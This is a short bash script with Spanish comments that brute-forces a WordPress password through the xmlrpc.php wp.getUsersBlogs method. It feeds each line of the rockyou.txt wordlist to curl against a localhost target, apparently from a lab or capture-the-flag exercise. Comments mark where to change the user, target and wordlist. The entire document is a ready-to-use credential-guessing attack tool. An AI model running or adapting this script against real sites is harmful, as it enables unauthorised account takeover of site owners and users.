trap ctrl_c SIGINT

function createXML( ){
    password=$1

   xmlFile="""
<? xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>serg</value></param> # cambiar user
<param><value>$password</value></param>
</params>
</methodCall>"""

    echo $xmlFile > file.xml

    response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml) # cambiar target

if [ ! "$(echo $response | grep 'Incorrect username or password. ' )" ]; then
    echo -e "\n[+] La contraseña para el usuario serg es $password"
    exit 0
fi
}
cat /usr/share/wordlists/rockyou.txt | while read password; do # cambiar wordlist si aplicase
    createXML $password
done